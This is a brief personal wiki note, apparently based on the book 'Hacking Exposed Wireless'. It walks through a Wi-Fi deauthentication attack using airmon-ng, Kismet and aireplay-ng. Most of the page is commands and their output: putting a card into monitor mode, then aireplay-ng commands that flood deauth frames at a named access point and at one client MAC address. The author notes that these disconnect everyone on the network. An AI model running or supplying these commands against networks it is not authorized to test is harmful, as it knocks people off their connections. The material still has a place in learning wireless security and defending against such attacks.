Based on the book Hacking Exposed Wireless
= Goal =
The goal is aimed at deauthentication a computer from the AP

== Step one - Monitor mode ==
* [[kismet]] -- shoud be installed

Find the interface that I am running:
    sudo airmon-ng

    Interface       Chipset         Driver

    wlp3s0b1                Broadcom        b43 - [phy0]

    sudo airmon-ng check wlp3s0b1
    sudo airmon-ng stop wlp3s0b1

To start the network card in monitor mode:

	âžœ  Hacking sudo airmon-ng start wlp3s0b1


	Found 5 processes that could cause trouble.
	If airodump-ng, aireplay-ng or airtun-ng stops working after
	a short period of time, you may want to kill (some of) them!

	PID     Name
	1196    NetworkManager
	1197    avahi-daemon
	1202    avahi-daemon
	1337    wpa_supplicant
	24176   dhclient


	Interface       Chipset         Driver

	wlp3s0b1                Broadcom        b43 - [phy0]
									(monitor mode enabled on mon0)


Sometimes, it might be necessary to use the command iw.
    iw dev mon0 link
    Not connected.

Example output when not connected to an AP.

== Use Kismet ==
Start kismet and choose add source : mon0

Finally, I have used the following command:
sudo aireplay-ng --deauth 1000 -a A0:21:B7:D5:BA:F6  wlp3s0b1

This command will deconnect everyone connected to this bssid.

I could not find the clients MAC address. I will have to investigate.

== Use AirCrack ==

I could find the Station and now I can run the full command:
    sudo aireplay-ng --deauth 1000 -a A0:21:B7:D5:BA:F6 -c A0:88:B4:D6:DF:90 wlp3s0b1
